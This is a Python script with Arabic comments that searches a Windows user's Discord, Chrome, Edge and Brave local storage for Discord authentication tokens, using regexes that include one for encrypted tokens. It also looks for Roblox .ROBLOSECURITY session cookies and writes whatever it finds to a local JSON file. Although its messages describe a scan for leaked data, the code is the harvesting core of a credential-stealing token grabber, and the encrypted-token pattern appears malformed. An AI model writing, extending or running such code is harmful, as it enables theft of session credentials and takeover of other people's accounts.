import os
import re
import json

def get_paths():
    # مسارات المتصفحات والتطبيقات الشائعة على نظام ويندوز
    user_profile = os.environ.get("USERPROFILE", "")
    paths = {
        "Discord": os.path.join(user_profile, "AppData", "Roaming", "Discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(user_profile, "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(user_profile, "AppData", "Roaming", "discordptb", "Local Storage", "leveldb"),
        "Chrome": os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
        "Edge": os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
        "Brave": os.path.join(user_profile, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
        "Roblox Cookies": os.path.join(user_profile, "AppData", "Local", "Roblox")
    }
    return paths

def extract_discord_tokens(path):
    tokens = set()
    if not os.path.exists(path):
        return tokens
    
    # البحث في ملفات leveldb الخاصة بـ Discord المتصفحات
    for file_name in os.listdir(path):
        if file_name.endswith(".ldb") or file_name.endswith(".log"):
            file_path = os.path.join(path, file_name)
            try:
                with open(file_path, "r", errors="ignore") as f:
                    content = f.read()
                    
                    # أنماط التوكنات العادية والتشفير الجديد في ديسكورد
                    encrypted_regex = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{58}", content)
                    standard_regex = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content)
                    
                    for t in encrypted_regex:
                        tokens.add(t)
                    for t in standard_regex:
                        tokens.add(t)
            except Exception:
                pass
    return tokens

def search_roblox_data(path):
    roblox_data = []
    if not os.path.exists(path):
        return roblox_data
    
    # البحث عن ملفات التخزين المؤقت أو الكوكيز المرتبطة بروبلوكس (.txt, .json, .sqlite)
    for root, dirs, files in os.walk(path):
        for file in files:
            if file.endswith((".txt", ".json", ".sqlite", ".log")):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, "r", errors="ignore") as f:
                        text = f.read()
                        # البحث عن ملفات تعريف الارتباط المعروفة لروبلوكس (.ROBLOSECURITY)
                        if ".ROBLOSECURITY" in text or "_|WARNING:-DO-NOT-SHARE-THIS--" in text:
                            roblox_data.append(full_path)
                except Exception:
                    pass
    return roblox_data

def main():
    print("[*] جاري فحص مسارات النظام عن التوكنات والبيانات المسربة...\n")
    paths = get_paths()
    
    all_tokens = {}
    
    for name, path in paths.items():
        print(f"[-] فحص مسار: {name}")
        if "Discord" in name or "Chrome" in name or "Edge" in name or "Brave" in name:
            tokens = extract_discord_tokens(path)
            if tokens:
                all_tokens[name] = list(tokens)
                print(f"    [+] تم العثور على {len(tokens)} عنصر في {name}")
            else:
                print(f"    [-] لم يتم العثور على عناصر مباشرة في {name}")
        elif "Roblox" in name:
            r_files = search_roblox_data(path)
            if r_files:
                all_tokens[name] = r_files
                print(f"    [+] تم العثور على ملفات مرتبطة بروبلوكس: {len(r_files)}")
            else:
                print(f"    [-] لم يتم العثور على ملفات استخراج روبلوكس مطابقة هنا")

    print("\n[+] اكتمل الفحص.")
    
    # حفظ النتائج في ملف نصي محلي ضمن مسار العمل
    output_file = "extracted_data.json"
    with open(output_file, "w", encoding="utf-8") as out:
        json.dump(all_tokens, out, indent=4, ensure_ascii=False)
    print(f"[+] تم تصدير النتائج وحفظها في الملف: {output_file}")

if __name__ == "__main__":
    main()
